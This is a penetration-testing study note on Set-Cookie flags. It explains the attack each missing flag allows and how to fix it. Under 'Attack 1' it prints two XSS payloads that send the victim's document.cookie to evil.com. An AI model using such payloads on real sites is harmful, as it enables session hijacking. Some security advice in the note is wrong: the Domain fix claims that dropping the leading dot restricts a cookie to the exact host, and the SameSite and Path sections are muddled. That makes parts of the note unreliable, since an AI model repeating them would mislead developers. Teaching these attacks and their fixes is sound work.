---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.47 Set-Cookie flags — HttpOnly, Secure, SameSite, Path, Domain"
portswigger_labs: ["Session token labs", "Cookie flags"]
---

# 03.47 — Set-Cookie Flags

## What is it?

The `Set-Cookie` response header tells the browser to store a cookie. The flags attached to it determine the cookie's security properties — when it's sent, who can read it, and whether it can be accessed from JavaScript. Missing flags are direct vulnerabilities.

---

## Full Anatomy

```
Set-Cookie: name=value; Expires=Tue, 01 Jan 2030 00:00:00 GMT; Max-Age=86400; Domain=.target.com; Path=/; Secure; HttpOnly; SameSite=Strict

EACH FLAG:

name=value             → cookie data
Expires=               → absolute expiry (not set = session cookie)
Max-Age=               → relative expiry in seconds (overrides Expires)
Domain=.target.com     → which hosts receive cookie (. = include subdomains!)
Path=/                 → URL path prefix that triggers sending cookie
Secure                 → only send over HTTPS
HttpOnly               → JavaScript cannot read cookie (prevents XSS theft)
SameSite=Strict        → never sent on cross-site requests (CSRF protection)
SameSite=Lax           → sent on top-level navigations only
SameSite=None          → always sent (requires Secure)
```

---

## Attack 1: Missing HttpOnly → XSS Cookie Theft

```
SET-COOKIE (vulnerable):
  Set-Cookie: session=abc123

XSS PAYLOAD (steals session):
  document.location = 'https://evil.com/?c=' + document.cookie
  
  OR:
  new Image().src = 'https://evil.com/?c=' + encodeURIComponent(document.cookie)

FIX:
  Set-Cookie: session=abc123; HttpOnly
  → document.cookie cannot access session cookie!
```

---

## Attack 2: Missing Secure → SSL Strip Interception

```
SET-COOKIE (vulnerable):
  Set-Cookie: session=abc123   (no Secure flag)

ATTACK (SSL stripping or HTTP interception):
  User visits http://target.com (or HTTP page on same domain)
  Browser sends cookie even over HTTP!
  MITM attacker intercepts → session hijacked!

FIX:
  Set-Cookie: session=abc123; Secure
  → Cookie only sent over HTTPS!
```

---

## Attack 3: Missing SameSite → CSRF

```
SET-COOKIE (vulnerable):
  Set-Cookie: session=abc123   (no SameSite; defaults to Lax in modern browsers)

PRE-2020 (SameSite=None was default):
  All cross-origin requests sent cookie → full CSRF possible!

MODERN (SameSite=Lax is default in Chrome 80+):
  Cross-origin requests from links still send cookie!
  Only POST/DELETE cross-origin forms are blocked.

FIX:
  Set-Cookie: session=abc123; SameSite=Strict
  → Cookie NEVER sent on cross-site requests!
```

---

## Attack 4: Domain Too Broad → Cookie Scope Abuse

```
SET-COOKIE:
  Set-Cookie: session=abc123; Domain=.target.com

IMPLICATION:
  Cookie sent to ALL subdomains: api.target.com, dev.target.com, evil.target.com!
  
  If ANY subdomain is compromised (XSS, takeover):
  → Can steal main session cookie!
  → Can set cookies for main domain (cookie tossing)!

FIX:
  Set-Cookie: session=abc123; Domain=target.com  (without leading dot)
  → Only exact domain (no subdomains)
  → OR: set cookie without Domain attribute (defaults to current host only)
```

---

## Attack 5: Path Too Permissive

```
SET-COOKIE:
  Set-Cookie: admin_session=abc; Path=/admin

IMPLICATION:
  Cookie only sent to /admin/* paths.
  But if / also has sensitive operations → user session needed too.
  
  Sometimes admin sessions leaked to non-admin paths if Path= is / (default).
```

---

## Cookie Flag Checklist

```
For session cookies (authentication):
  ✓ HttpOnly → prevents JavaScript access
  ✓ Secure   → HTTPS only
  ✓ SameSite=Strict → no cross-site
  ✓ Path=/   → all paths (or restrict if possible)
  ✓ Domain without leading dot → no subdomain sharing

CHECKING WITH CURL:
  curl -sI https://target.com/login \
    -X POST -d "user=admin&pass=test" | grep "set-cookie"
  
  Look for: HttpOnly, Secure, SameSite in each Set-Cookie!

CHECKING WITH BURP SUITE:
  Burp Proxy → HTTP History → response
  Right-click → Request in browser → Open in embedded browser
  → DevTools → Application → Cookies → see all flags!
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| No HttpOnly | Add HttpOnly to all session cookies |
| No Secure | Add Secure to all session cookies |
| No SameSite (legacy) | Add SameSite=Strict |
| Domain too broad | Avoid Domain= or use specific host |

---

## Related Notes
- [[02.11 - Cookies Structure Flags Lifecycle]] — cookie lifecycle
- [[17 - Cookie]] — Cookie request header (reading cookies)
- [[Module 02 - XSS]] — XSS for cookie theft
- [[Module 07 - CSRF]] — SameSite CSRF protection
